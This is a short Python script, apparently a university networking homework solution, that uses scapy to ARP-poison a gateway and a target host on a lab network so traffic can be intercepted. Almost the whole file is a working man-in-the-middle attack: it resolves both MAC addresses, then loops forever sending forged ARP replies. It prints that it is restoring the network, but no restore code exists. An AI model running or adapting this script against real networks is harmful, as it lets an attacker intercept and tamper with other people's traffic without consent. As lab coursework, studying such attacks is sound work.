from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parameters
gateway_ip = "198.13.13.1"
target_ip = "198.13.0.14"

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    while True:
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
        time.sleep(2)
    print("[*] Stopped ARP poison attack. Restoring network")

#Start the script
print("[*]Start the script")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Gateway MAC address: " + str(gateway_mac))
time.sleep(5)

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address: " + str(target_mac))
time.sleep(5)

print("[*]Start poisoning")
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

# python /elocal/rezolvare\ tema2/arp_poisoning.py from mid1
# wget http://moodle.fmi.unibuc.ro from rt1
# tcpdump from rt1

